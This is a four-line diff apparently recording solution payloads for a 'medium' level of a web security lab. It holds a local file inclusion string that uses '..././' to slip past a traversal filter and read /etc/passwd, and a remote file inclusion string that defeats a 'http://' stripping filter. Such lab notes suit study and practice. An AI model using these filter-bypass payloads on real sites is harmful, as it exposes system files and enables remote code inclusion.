@@ -1,0 +1,4 @@
+medium== 
+             
+       LFI 1== ..././..././..././..././..././..././..././etc/passwd
+       RFI 2== hthttp://tp://google.com
